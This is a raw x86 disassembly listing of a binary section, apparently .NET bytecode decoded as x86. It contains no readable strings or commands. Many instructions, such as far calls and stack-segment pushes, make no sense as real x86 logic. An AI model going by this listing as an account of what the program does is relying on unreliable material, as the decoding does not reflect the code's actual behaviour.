  405371:	16                   	push   %ss
  405372:	33 24 28             	xor    (%eax,%ebp,1),%esp
  405375:	04 00                	add    $0x0,%al
  405377:	00 06                	add    %al,(%esi)
  405379:	6f                   	outsl  %ds:(%esi),(%dx)
  40537a:	bf 00 00 0a 06       	mov    $0x60a0000,%edi
  40537f:	7b 28                	jnp    0x4053a9
  405381:	00 00                	add    %al,(%eax)
  405383:	04 17                	add    $0x17,%al
  405385:	9a 06 7b 28 00 00 04 	lcall  $0x400,$0x287b06
  40538c:	18 9a 6f c0 00 00    	sbb    %bl,0xc06f(%edx)
  405392:	0a 38                	or     (%eax),%bh
  405394:	10 0a                	adc    %cl,(%edx)
  405396:	00 00                	add    %al,(%eax)
  405398:	11 23                	adc    %esp,(%ebx)
  40539a:	72 fd                	jb     0x405399
  40539c:	08 00                	or     %al,(%eax)
  40539e:	70 16                	jo     0x4053b6
  4053a0:	28 69 00             	sub    %ch,0x0(%ecx)
  4053a3:	00 0a                	add    %cl,(%edx)
  4053a5:	16                   	push   %ss
  4053a6:	33 13                	xor    (%ebx),%edx
  4053a8:	06                   	push   %es
  4053a9:	7b 28                	jnp    0x4053d3
  4053ab:	00 00                	add    %al,(%eax)
  4053ad:	04 17                	add    $0x17,%al
  4053af:	9a 28 c1 00 00 0a 26 	lcall  $0x260a,$0xc128
  4053b6:	38 ed                	cmp    %ch,%ch
  4053b8:	09 00                	or     %eax,(%eax)
  4053ba:	00 11                	add    %dl,(%ecx)
  4053bc:	23 72 07             	and    0x7(%edx),%esi
  4053bf:	09 00                	or     %eax,(%eax)
  4053c1:	70 16                	jo     0x4053d9
  4053c3:	28 69 00             	sub    %ch,0x0(%ecx)
  4053c6:	00 0a                	add    %cl,(%edx)
  4053c8:	16                   	push   %ss
  4053c9:	33 24 28             	xor    (%eax,%ebp,1),%esp
  4053cc:	04 00                	add    $0x0,%al
  4053ce:	00 06                	add    %al,(%esi)
  4053d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4053d1:	bf 00 00 0a 06       	mov    $0x60a0000,%edi
  4053d6:	7b 28                	jnp    0x405400
  4053d8:	00 00                	add    %al,(%eax)
  4053da:	04 18                	add    $0x18,%al
  4053dc:	9a 06 7b 28 00 00 04 	lcall  $0x400,$0x287b06
  4053e3:	17                   	pop    %ss
  4053e4:	9a 6f c2 00 00 0a 38 	lcall  $0x380a,$0xc26f
  4053eb:	b9 09 00 00 11       	mov    $0x11000009,%ecx
  4053f0:	23 72 13             	and    0x13(%edx),%esi
  4053f3:	09 00                	or     %eax,(%eax)
  4053f5:	70 16                	jo     0x40540d
  4053f7:	28 69 00             	sub    %ch,0x0(%ecx)
  4053fa:	00 0a                	add    %cl,(%edx)
  4053fc:	16                   	push   %ss
  4053fd:	40                   	inc    %eax
  4053fe:	fc                   	cld
  4053ff:	00 00                	add    %al,(%eax)
  405401:	00 06                	add    %al,(%esi)
  405403:	7b 28                	jnp    0x40542d
  405405:	00 00                	add    %al,(%eax)
  405407:	04 17                	add    $0x17,%al
  405409:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405410:	72 1b                	jb     0x40542d
  405412:	09 00                	or     %eax,(%eax)
  405414:	70 19                	jo     0x40542f
  405416:	8d 03                	lea    (%ebx),%eax
  405418:	00 00                	add    %al,(%eax)
  40541a:	01 13                	add    %edx,(%ebx)
  40541c:	25 11 25 16 06       	and    $0x6162511,%eax
  405421:	7b 28                	jnp    0x40544b
  405423:	00 00                	add    %al,(%eax)
  405425:	04 13                	add    $0x13,%al
  405427:	29 11                	sub    %edx,(%ecx)
  405429:	29 18                	sub    %ebx,(%eax)
  40542b:	13 2a                	adc    (%edx),%ebp
  40542d:	11 2a                	adc    %ebp,(%edx)
  40542f:	9a a2 11 25 17 06 7b 	lcall  $0x7b06,$0x172511a2
  405436:	28 00                	sub    %al,(%eax)
  405438:	00 04 13             	add    %al,(%ebx,%edx,1)
  40543b:	27                   	daa
  40543c:	11 27                	adc    %esp,(%edi)
  40543e:	19 13                	sbb    %edx,(%ebx)
  405440:	28 11                	sub    %dl,(%ecx)
  405442:	28 9a a2 11 25 18    	sub    %bl,0x182511a2(%edx)
  405448:	06                   	push   %es
  405449:	7b 28                	jnp    0x405473
  40544b:	00 00                	add    %al,(%eax)
  40544d:	04 13                	add    $0x13,%al
  40544f:	3a 11                	cmp    (%ecx),%dl
  405451:	3a 1a                	cmp    (%edx),%bl
  405453:	13 3b                	adc    (%ebx),%edi
  405455:	11 3b                	adc    %edi,(%ebx)
  405457:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  40545e:	24 14                	and    $0x14,%al
  405460:	14 19                	adc    $0x19,%al
  405462:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405465:	00 01                	add    %al,(%ecx)
  405467:	13 26                	adc    (%esi),%esp
  405469:	11 26                	adc    %esp,(%esi)
  40546b:	16                   	push   %ss
  40546c:	17                   	pop    %ss
  40546d:	9c                   	pushf
  40546e:	11 26                	adc    %esp,(%esi)
  405470:	17                   	pop    %ss
  405471:	17                   	pop    %ss
  405472:	9c                   	pushf
  405473:	11 26                	adc    %esp,(%esi)
  405475:	18 17                	sbb    %dl,(%edi)
  405477:	9c                   	pushf
  405478:	11 26                	adc    %esp,(%esi)
  40547a:	17                   	pop    %ss
  40547b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40547f:	0a 26                	or     (%esi),%ah
  405481:	11 26                	adc    %esp,(%esi)
  405483:	16                   	push   %ss
  405484:	90                   	nop
  405485:	2c 22                	sub    $0x22,%al
  405487:	11 29                	adc    %ebp,(%ecx)
  405489:	11 2a                	adc    %ebp,(%edx)
  40548b:	11 24 16             	adc    %esp,(%esi,%edx,1)
  40548e:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405495:	28 00                	sub    %al,(%eax)
  405497:	00 01                	add    %al,(%ecx)
  405499:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40549c:	00 0a                	add    %cl,(%edx)
  40549e:	28 6d 00             	sub    %ch,0x0(%ebp)
  4054a1:	00 0a                	add    %cl,(%edx)
  4054a3:	74 28                	je     0x4054cd
  4054a5:	00 00                	add    %al,(%eax)
  4054a7:	01 a2 11 26 17 90    	add    %esp,-0x6fe8d9ef(%edx)
  4054ad:	2c 22                	sub    $0x22,%al
  4054af:	11 27                	adc    %esp,(%edi)
  4054b1:	11 28                	adc    %ebp,(%eax)
  4054b3:	11 24 17             	adc    %esp,(%edi,%edx,1)
  4054b6:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4054bd:	28 00                	sub    %al,(%eax)
  4054bf:	00 01                	add    %al,(%ecx)
  4054c1:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4054c4:	00 0a                	add    %cl,(%edx)
  4054c6:	28 6d 00             	sub    %ch,0x0(%ebp)
  4054c9:	00 0a                	add    %cl,(%edx)
  4054cb:	74 28                	je     0x4054f5
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	01 a2 11 26 18 90    	add    %esp,-0x6fe7d9ef(%edx)
  4054d5:	2c 22                	sub    $0x22,%al
  4054d7:	11 3a                	adc    %edi,(%edx)
  4054d9:	11 3b                	adc    %edi,(%ebx)
  4054db:	11 24 18             	adc    %esp,(%eax,%ebx,1)
  4054de:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4054e5:	28 00                	sub    %al,(%eax)
  4054e7:	00 01                	add    %al,(%ecx)
  4054e9:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4054ec:	00 0a                	add    %cl,(%edx)
  4054ee:	28 6d 00             	sub    %ch,0x0(%ebp)
  4054f1:	00 0a                	add    %cl,(%edx)
  4054f3:	74 28                	je     0x40551d
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	01 a2 38 aa 08 00    	add    %esp,0x8aa38(%edx)
  4054fd:	00 11                	add    %dl,(%ecx)
  4054ff:	23 72 23             	and    0x23(%edx),%esi
  405502:	09 00                	or     %eax,(%eax)
  405504:	70 16                	jo     0x40551c
  405506:	28 69 00             	sub    %ch,0x0(%ecx)
  405509:	00 0a                	add    %cl,(%edx)
  40550b:	16                   	push   %ss
  40550c:	40                   	inc    %eax
  40550d:	64 01 00             	add    %eax,%fs:(%eax)
  405510:	00 7e 20             	add    %bh,0x20(%esi)
  405513:	00 00                	add    %al,(%eax)
  405515:	04 17                	add    $0x17,%al
  405517:	33 05 38 52 01 00    	xor    0x15238,%eax
  40551d:	00 17                	add    %dl,(%edi)
  40551f:	80 20 00             	andb   $0x0,(%eax)
  405522:	00 04 06             	add    %al,(%esi,%eax,1)
  405525:	7b 28                	jnp    0x40554f
  405527:	00 00                	add    %al,(%eax)
  405529:	04 17                	add    $0x17,%al
  40552b:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405532:	72 6b                	jb     0x40559f
  405534:	07                   	pop    %es
  405535:	00 70 1b             	add    %dh,0x1b(%eax)
  405538:	8d 03                	lea    (%ebx),%eax
  40553a:	00 00                	add    %al,(%eax)
  40553c:	01 13                	add    %edx,(%ebx)
  40553e:	25 11 25 16 28       	and    $0x28162511,%eax
  405543:	38 00                	cmp    %al,(%eax)
  405545:	00 06                	add    %al,(%esi)
  405547:	a2 11 25 17 06       	mov    %al,0x6172511
  40554c:	7b 28                	jnp    0x405576
  40554e:	00 00                	add    %al,(%eax)
  405550:	04 13                	add    $0x13,%al
  405552:	3a 11                	cmp    (%ecx),%dl
  405554:	3a 18                	cmp    (%eax),%bl
  405556:	13 3b                	adc    (%ebx),%edi
  405558:	11 3b                	adc    %edi,(%ebx)
  40555a:	9a a2 11 25 18 06 7b 	lcall  $0x7b06,$0x182511a2
  405561:	28 00                	sub    %al,(%eax)
  405563:	00 04 13             	add    %al,(%ebx,%edx,1)
  405566:	29 11                	sub    %edx,(%ecx)
  405568:	29 19                	sub    %ebx,(%ecx)
  40556a:	13 2a                	adc    (%edx),%ebp
  40556c:	11 2a                	adc    %ebp,(%edx)
  40556e:	9a a2 11 25 19 06 7b 	lcall  $0x7b06,$0x192511a2
  405575:	28 00                	sub    %al,(%eax)
  405577:	00 04 13             	add    %al,(%ebx,%edx,1)
  40557a:	27                   	daa
  40557b:	11 27                	adc    %esp,(%edi)
  40557d:	1a 13                	sbb    (%ebx),%dl
  40557f:	28 11                	sub    %dl,(%ecx)
  405581:	28 9a a2 11 25 1a    	sub    %bl,0x1a2511a2(%edx)
  405587:	06                   	push   %es
  405588:	7b 28                	jnp    0x4055b2
  40558a:	00 00                	add    %al,(%eax)
  40558c:	04 13                	add    $0x13,%al
  40558e:	3c 11                	cmp    $0x11,%al
  405590:	3c 1b                	cmp    $0x1b,%al
  405592:	13 3d 11 3d 9a a2    	adc    0xa29a3d11,%edi
  405598:	11 25 13 24 11 24    	adc    %esp,0x24112413
  40559e:	14 14                	adc    $0x14,%al
  4055a0:	1b 8d 3c 00 00 01    	sbb    0x100003c(%ebp),%ecx
  4055a6:	13 26                	adc    (%esi),%esp
  4055a8:	11 26                	adc    %esp,(%esi)
  4055aa:	16                   	push   %ss
  4055ab:	16                   	push   %ss
  4055ac:	9c                   	pushf
  4055ad:	11 26                	adc    %esp,(%esi)
  4055af:	17                   	pop    %ss
  4055b0:	17                   	pop    %ss
  4055b1:	9c                   	pushf
  4055b2:	11 26                	adc    %esp,(%esi)
  4055b4:	18 17                	sbb    %dl,(%edi)
  4055b6:	9c                   	pushf
  4055b7:	11 26                	adc    %esp,(%esi)
  4055b9:	19 17                	sbb    %edx,(%edi)
  4055bb:	9c                   	pushf
  4055bc:	11 26                	adc    %esp,(%esi)
  4055be:	1a 17                	sbb    (%edi),%dl
  4055c0:	9c                   	pushf
  4055c1:	11 26                	adc    %esp,(%esi)
  4055c3:	17                   	pop    %ss
  4055c4:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4055c8:	0a 26                	or     (%esi),%ah
  4055ca:	11 26                	adc    %esp,(%esi)
  4055cc:	17                   	pop    %ss
  4055cd:	90                   	nop
  4055ce:	2c 22                	sub    $0x22,%al
  4055d0:	11 3a                	adc    %edi,(%edx)
  4055d2:	11 3b                	adc    %edi,(%ebx)
  4055d4:	11 24 17             	adc    %esp,(%edi,%edx,1)
  4055d7:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  4055de:	28 00                	sub    %al,(%eax)
  4055e0:	00 01                	add    %al,(%ecx)
  4055e2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4055e5:	00 0a                	add    %cl,(%edx)
  4055e7:	28 6d 00             	sub    %ch,0x0(%ebp)
  4055ea:	00 0a                	add    %cl,(%edx)
  4055ec:	74 28                	je     0x405616
  4055ee:	00 00                	add    %al,(%eax)
  4055f0:	01 a2 11 26 18 90    	add    %esp,-0x6fe7d9ef(%edx)
  4055f6:	2c 22                	sub    $0x22,%al
  4055f8:	11 29                	adc    %ebp,(%ecx)
  4055fa:	11 2a                	adc    %ebp,(%edx)
  4055fc:	11 24 18             	adc    %esp,(%eax,%ebx,1)
  4055ff:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405606:	28 00                	sub    %al,(%eax)
  405608:	00 01                	add    %al,(%ecx)
  40560a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40560d:	00 0a                	add    %cl,(%edx)
  40560f:	28 6d 00             	sub    %ch,0x0(%ebp)
  405612:	00 0a                	add    %cl,(%edx)
  405614:	74 28                	je     0x40563e
  405616:	00 00                	add    %al,(%eax)
  405618:	01 a2 11 26 19 90    	add    %esp,-0x6fe6d9ef(%edx)
  40561e:	2c 22                	sub    $0x22,%al
  405620:	11 27                	adc    %esp,(%edi)
  405622:	11 28                	adc    %ebp,(%eax)
  405624:	11 24 19             	adc    %esp,(%ecx,%ebx,1)
  405627:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  40562e:	28 00                	sub    %al,(%eax)
  405630:	00 01                	add    %al,(%ecx)
  405632:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405635:	00 0a                	add    %cl,(%edx)
  405637:	28 6d 00             	sub    %ch,0x0(%ebp)
  40563a:	00 0a                	add    %cl,(%edx)
  40563c:	74 28                	je     0x405666
  40563e:	00 00                	add    %al,(%eax)
  405640:	01 a2 11 26 1a 90    	add    %esp,-0x6fe5d9ef(%edx)
  405646:	2c 22                	sub    $0x22,%al
  405648:	11 3c 11             	adc    %edi,(%ecx,%edx,1)
  40564b:	3d 11 24 1a 9a       	cmp    $0x9a1a2411,%eax
  405650:	28 11                	sub    %dl,(%ecx)
  405652:	00 00                	add    %al,(%eax)
  405654:	0a d0                	or     %al,%dl
  405656:	28 00                	sub    %al,(%eax)
  405658:	00 01                	add    %al,(%ecx)
  40565a:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40565d:	00 0a                	add    %cl,(%edx)
  40565f:	28 6d 00             	sub    %ch,0x0(%ebp)
  405662:	00 0a                	add    %cl,(%edx)
  405664:	74 28                	je     0x40568e
  405666:	00 00                	add    %al,(%eax)
  405668:	01 a2 18 80 20 00    	add    %esp,0x208018(%edx)
  40566e:	00 04 38             	add    %al,(%eax,%edi,1)
  405671:	33 07                	xor    (%edi),%eax
  405673:	00 00                	add    %al,(%eax)
  405675:	11 23                	adc    %esp,(%ebx)
  405677:	72 2d                	jb     0x4056a6
  405679:	09 00                	or     %eax,(%eax)
  40567b:	70 16                	jo     0x405693
  40567d:	28 69 00             	sub    %ch,0x0(%ecx)
  405680:	00 0a                	add    %cl,(%edx)
  405682:	16                   	push   %ss
  405683:	33 49 7e             	xor    0x7e(%ecx),%ecx
  405686:	20 00                	and    %al,(%eax)
  405688:	00 04 18             	add    %al,(%eax,%ebx,1)
  40568b:	33 3c 17             	xor    (%edi,%edx,1),%edi
  40568e:	80 20 00             	andb   $0x0,(%eax)
  405691:	00 04 06             	add    %al,(%esi,%eax,1)
  405694:	7b 28                	jnp    0x4056be
  405696:	00 00                	add    %al,(%eax)
  405698:	04 17                	add    $0x17,%al
  40569a:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4056a1:	72 73                	jb     0x405716
  4056a3:	07                   	pop    %es
  4056a4:	00 70 17             	add    %dh,0x17(%eax)
  4056a7:	8d 03                	lea    (%ebx),%eax
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	01 13                	add    %edx,(%ebx)
  4056ad:	25 11 25 16 28       	and    $0x28162511,%eax
  4056b2:	38 00                	cmp    %al,(%eax)
  4056b4:	00 06                	add    %al,(%esi)
  4056b6:	a2 11 25 14 14       	mov    %al,0x14142511
  4056bb:	14 17                	adc    $0x17,%al
  4056bd:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4056c1:	0a 26                	or     (%esi),%ah
  4056c3:	16                   	push   %ss
  4056c4:	80 20 00             	andb   $0x0,(%eax)
  4056c7:	00 04 38             	add    %al,(%eax,%edi,1)
  4056ca:	da 06                	fiaddl (%esi)
  4056cc:	00 00                	add    %al,(%eax)
  4056ce:	11 23                	adc    %esp,(%ebx)
  4056d0:	72 37                	jb     0x405709
  4056d2:	09 00                	or     %eax,(%eax)
  4056d4:	70 16                	jo     0x4056ec
  4056d6:	28 69 00             	sub    %ch,0x0(%ecx)
  4056d9:	00 0a                	add    %cl,(%edx)
  4056db:	16                   	push   %ss
  4056dc:	40                   	inc    %eax
  4056dd:	bb 00 00 00 06       	mov    $0x6000000,%ebx
  4056e2:	7b 28                	jnp    0x40570c
  4056e4:	00 00                	add    %al,(%eax)
  4056e6:	04 17                	add    $0x17,%al
  4056e8:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  4056ef:	72 41                	jb     0x405732
  4056f1:	09 00                	or     %eax,(%eax)
  4056f3:	70 18                	jo     0x40570d
  4056f5:	8d 03                	lea    (%ebx),%eax
  4056f7:	00 00                	add    %al,(%eax)
  4056f9:	01 13                	add    %edx,(%ebx)
  4056fb:	25 11 25 16 06       	and    $0x6162511,%eax
  405700:	7b 28                	jnp    0x40572a
  405702:	00 00                	add    %al,(%eax)
  405704:	04 13                	add    $0x13,%al
  405706:	3c 11                	cmp    $0x11,%al
  405708:	3c 18                	cmp    $0x18,%al
  40570a:	13 3d 11 3d 9a a2    	adc    0xa29a3d11,%edi
  405710:	11 25 17 06 7b 28    	adc    %esp,0x287b0617
  405716:	00 00                	add    %al,(%eax)
  405718:	04 13                	add    $0x13,%al
  40571a:	3a 11                	cmp    (%ecx),%dl
  40571c:	3a 19                	cmp    (%ecx),%bl
  40571e:	13 3b                	adc    (%ebx),%edi
  405720:	11 3b                	adc    %edi,(%ebx)
  405722:	9a a2 11 25 13 24 11 	lcall  $0x1124,$0x132511a2
  405729:	24 14                	and    $0x14,%al
  40572b:	14 18                	adc    $0x18,%al
  40572d:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405730:	00 01                	add    %al,(%ecx)
  405732:	13 26                	adc    (%esi),%esp
  405734:	11 26                	adc    %esp,(%esi)
  405736:	16                   	push   %ss
  405737:	17                   	pop    %ss
  405738:	9c                   	pushf
  405739:	11 26                	adc    %esp,(%esi)
  40573b:	17                   	pop    %ss
  40573c:	17                   	pop    %ss
  40573d:	9c                   	pushf
  40573e:	11 26                	adc    %esp,(%esi)
  405740:	17                   	pop    %ss
  405741:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405745:	0a 26                	or     (%esi),%ah
  405747:	11 26                	adc    %esp,(%esi)
  405749:	16                   	push   %ss
  40574a:	90                   	nop
  40574b:	2c 22                	sub    $0x22,%al
  40574d:	11 3c 11             	adc    %edi,(%ecx,%edx,1)
  405750:	3d 11 24 16 9a       	cmp    $0x9a162411,%eax
  405755:	28 11                	sub    %dl,(%ecx)
  405757:	00 00                	add    %al,(%eax)
  405759:	0a d0                	or     %al,%dl
  40575b:	28 00                	sub    %al,(%eax)
  40575d:	00 01                	add    %al,(%ecx)
  40575f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405762:	00 0a                	add    %cl,(%edx)
  405764:	28 6d 00             	sub    %ch,0x0(%ebp)
  405767:	00 0a                	add    %cl,(%edx)
  405769:	74 28                	je     0x405793
  40576b:	00 00                	add    %al,(%eax)
  40576d:	01 a2 11 26 17 90    	add    %esp,-0x6fe8d9ef(%edx)
  405773:	2c 22                	sub    $0x22,%al
  405775:	11 3a                	adc    %edi,(%edx)
  405777:	11 3b                	adc    %edi,(%ebx)
  405779:	11 24 17             	adc    %esp,(%edi,%edx,1)
  40577c:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405783:	28 00                	sub    %al,(%eax)
  405785:	00 01                	add    %al,(%ecx)
  405787:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40578a:	00 0a                	add    %cl,(%edx)
  40578c:	28 6d 00             	sub    %ch,0x0(%ebp)
  40578f:	00 0a                	add    %cl,(%edx)
  405791:	74 28                	je     0x4057bb
  405793:	00 00                	add    %al,(%eax)
  405795:	01 a2 38 0c 06 00    	add    %esp,0x60c38(%edx)
  40579b:	00 11                	add    %dl,(%ecx)
  40579d:	23 72 49             	and    0x49(%edx),%esi
  4057a0:	09 00                	or     %eax,(%eax)
  4057a2:	70 16                	jo     0x4057ba
  4057a4:	28 69 00             	sub    %ch,0x0(%ecx)
  4057a7:	00 0a                	add    %cl,(%edx)
  4057a9:	16                   	push   %ss
  4057aa:	33 28                	xor    (%eax),%ebp
  4057ac:	72 49                	jb     0x4057f7
  4057ae:	09 00                	or     %eax,(%eax)
  4057b0:	70 7e                	jo     0x405830
  4057b2:	19 00                	sbb    %eax,(%eax)
  4057b4:	00 04 28             	add    %al,(%eax,%ebp,1)
  4057b7:	66 00 00             	data16 add %al,(%eax)
  4057ba:	0a 28                	or     (%eax),%ch
  4057bc:	38 00                	cmp    %al,(%eax)
  4057be:	00 06                	add    %al,(%esi)
  4057c0:	28 66 00             	sub    %ah,0x0(%esi)
  4057c3:	00 0a                	add    %cl,(%edx)
  4057c5:	28 3b                	sub    %bh,(%ebx)
  4057c7:	00 00                	add    %al,(%eax)
  4057c9:	0a 28                	or     (%eax),%ch
  4057cb:	1c 00                	sbb    $0x0,%al
  4057cd:	00 06                	add    %al,(%esi)
  4057cf:	38 d4                	cmp    %dl,%ah
  4057d1:	05 00 00 11 23       	add    $0x23110000,%eax
  4057d6:	72 55                	jb     0x40582d
  4057d8:	09 00                	or     %eax,(%eax)
  4057da:	70 16                	jo     0x4057f2
  4057dc:	28 69 00             	sub    %ch,0x0(%ecx)
  4057df:	00 0a                	add    %cl,(%edx)
  4057e1:	16                   	push   %ss
  4057e2:	40                   	inc    %eax
  4057e3:	b6 00                	mov    $0x0,%dh
  4057e5:	00 00                	add    %al,(%eax)
  4057e7:	7e 1f                	jle    0x405808
  4057e9:	00 00                	add    %al,(%eax)
  4057eb:	04 17                	add    $0x17,%al
  4057ed:	33 05 38 a4 00 00    	xor    0xa438,%eax
  4057f3:	00 17                	add    %dl,(%edi)
  4057f5:	80 1f 00             	sbbb   $0x0,(%edi)
  4057f8:	00 04 06             	add    %al,(%esi,%eax,1)
  4057fb:	7b 28                	jnp    0x405825
  4057fd:	00 00                	add    %al,(%eax)
  4057ff:	04 17                	add    $0x17,%al
  405801:	9a 28 3b 00 00 06 14 	lcall  $0x1406,$0x3b28
  405808:	72 d9                	jb     0x4057e3
  40580a:	06                   	push   %es
  40580b:	00 70 17             	add    %dh,0x17(%eax)
  40580e:	8d 03                	lea    (%ebx),%eax
  405810:	00 00                	add    %al,(%eax)
  405812:	01 13                	add    %edx,(%ebx)
  405814:	25 11 25 16 06       	and    $0x6162511,%eax
  405819:	7b 28                	jnp    0x405843
  40581b:	00 00                	add    %al,(%eax)
  40581d:	04 13                	add    $0x13,%al
  40581f:	3c 11                	cmp    $0x11,%al
  405821:	3c 18                	cmp    $0x18,%al
  405823:	13 3d 11 3d 9a a2    	adc    0xa29a3d11,%edi
  405829:	11 25 13 24 11 24    	adc    %esp,0x24112413
  40582f:	14 14                	adc    $0x14,%al
  405831:	17                   	pop    %ss
  405832:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405835:	00 01                	add    %al,(%ecx)
  405837:	13 26                	adc    (%esi),%esp
  405839:	11 26                	adc    %esp,(%esi)
  40583b:	16                   	push   %ss
  40583c:	17                   	pop    %ss
  40583d:	9c                   	pushf
  40583e:	11 26                	adc    %esp,(%esi)
  405840:	17                   	pop    %ss
  405841:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  405845:	0a 26                	or     (%esi),%ah
  405847:	11 26                	adc    %esp,(%esi)
  405849:	16                   	push   %ss
  40584a:	90                   	nop
  40584b:	2c 22                	sub    $0x22,%al
  40584d:	11 3c 11             	adc    %edi,(%ecx,%edx,1)
  405850:	3d 11 24 16 9a       	cmp    $0x9a162411,%eax
  405855:	28 11                	sub    %dl,(%ecx)
  405857:	00 00                	add    %al,(%eax)
  405859:	0a d0                	or     %al,%dl
  40585b:	28 00                	sub    %al,(%eax)
  40585d:	00 01                	add    %al,(%ecx)
  40585f:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405862:	00 0a                	add    %cl,(%edx)
  405864:	28 6d 00             	sub    %ch,0x0(%ebp)
  405867:	00 0a                	add    %cl,(%edx)
  405869:	74 28                	je     0x405893
  40586b:	00 00                	add    %al,(%eax)
  40586d:	01 a2 72 67 09 00    	add    %esp,0x96772(%edx)
  405873:	70 7e                	jo     0x4058f3
  405875:	19 00                	sbb    %eax,(%eax)
  405877:	00 04 28             	add    %al,(%eax,%ebp,1)
  40587a:	66 00 00             	data16 add %al,(%eax)
  40587d:	0a 28                	or     (%eax),%ch
  40587f:	38 00                	cmp    %al,(%eax)
  405881:	00 06                	add    %al,(%esi)
  405883:	28 66 00             	sub    %ah,0x0(%esi)
  405886:	00 0a                	add    %cl,(%edx)
  405888:	28 3b                	sub    %bh,(%ebx)
  40588a:	00 00                	add    %al,(%eax)
  40588c:	0a 28                	or     (%eax),%ch
  40588e:	1c 00                	sbb    $0x0,%al
  405890:	00 06                	add    %al,(%esi)
  405892:	16                   	push   %ss
  405893:	80 1f 00             	sbbb   $0x0,(%edi)
  405896:	00 04 38             	add    %al,(%eax,%edi,1)
  405899:	0b 05 00 00 11 23    	or     0x23110000,%eax
  40589f:	72 7d                	jb     0x40591e
  4058a1:	09 00                	or     %eax,(%eax)
  4058a3:	70 16                	jo     0x4058bb
  4058a5:	28 69 00             	sub    %ch,0x0(%ecx)
  4058a8:	00 0a                	add    %cl,(%edx)
  4058aa:	16                   	push   %ss
  4058ab:	33 68 72             	xor    0x72(%eax),%ebp
  4058ae:	87 09                	xchg   %ecx,(%ecx)
  4058b0:	00 70 28             	add    %dh,0x28(%eax)
  4058b3:	c3                   	ret
  4058b4:	00 00                	add    %al,(%eax)
  4058b6:	0a 72 91             	or     -0x6f(%edx),%dh
  4058b9:	09 00                	or     %eax,(%eax)
  4058bb:	70 28                	jo     0x4058e5
  4058bd:	47                   	inc    %edi
  4058be:	00 00                	add    %al,(%eax)
  4058c0:	0a 28                	or     (%eax),%ch
  4058c2:	82 00 00             	addb   $0x0,(%eax)
  4058c5:	0a 2c 25 72 7d 09 00 	or     0x97d72(,%eiz,1),%ch
  4058cc:	70 7e                	jo     0x40594c
  4058ce:	19 00                	sbb    %eax,(%eax)
  4058d0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4058d3:	66 00 00             	data16 add %al,(%eax)
  4058d6:	0a 28                	or     (%eax),%ch
  4058d8:	38 00                	cmp    %al,(%eax)
  4058da:	00 06                	add    %al,(%esi)
  4058dc:	28 66 00             	sub    %ah,0x0(%esi)
  4058df:	00 0a                	add    %cl,(%edx)
  4058e1:	28 3b                	sub    %bh,(%ebx)
  4058e3:	00 00                	add    %al,(%eax)
  4058e5:	0a 28                	or     (%eax),%ch
  4058e7:	1c 00                	sbb    $0x0,%al
  4058e9:	00 06                	add    %al,(%esi)
  4058eb:	2b 23                	sub    (%ebx),%esp
  4058ed:	72 49                	jb     0x405938
  4058ef:	09 00                	or     %eax,(%eax)
  4058f1:	70 7e                	jo     0x405971
  4058f3:	19 00                	sbb    %eax,(%eax)
  4058f5:	00 04 28             	add    %al,(%eax,%ebp,1)
  4058f8:	66 00 00             	data16 add %al,(%eax)
  4058fb:	0a 28                	or     (%eax),%ch
  4058fd:	38 00                	cmp    %al,(%eax)
  4058ff:	00 06                	add    %al,(%esi)
  405901:	28 66 00             	sub    %ah,0x0(%esi)
  405904:	00 0a                	add    %cl,(%edx)
  405906:	28 3b                	sub    %bh,(%ebx)
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 28                	or     (%eax),%ch
  40590c:	1c 00                	sbb    $0x0,%al
  40590e:	00 06                	add    %al,(%esi)
  405910:	38 93 04 00 00 11    	cmp    %dl,0x11000004(%ebx)
  405916:	23 72 a7             	and    -0x59(%edx),%esi
  405919:	09 00                	or     %eax,(%eax)
  40591b:	70 16                	jo     0x405933
  40591d:	28 69 00             	sub    %ch,0x0(%ecx)
  405920:	00 0a                	add    %cl,(%edx)
  405922:	16                   	push   %ss
  405923:	40                   	inc    %eax
  405924:	eb 00                	jmp    0x405926
  405926:	00 00                	add    %al,(%eax)
  405928:	72 a7                	jb     0x4058d1
  40592a:	09 00                	or     %eax,(%eax)
  40592c:	70 7e                	jo     0x4059ac
  40592e:	19 00                	sbb    %eax,(%eax)
  405930:	00 04 28             	add    %al,(%eax,%ebp,1)
  405933:	71 00                	jno    0x405935
  405935:	00 0a                	add    %cl,(%edx)
  405937:	06                   	push   %es
  405938:	7b 28                	jnp    0x405962
  40593a:	00 00                	add    %al,(%eax)
  40593c:	04 17                	add    $0x17,%al
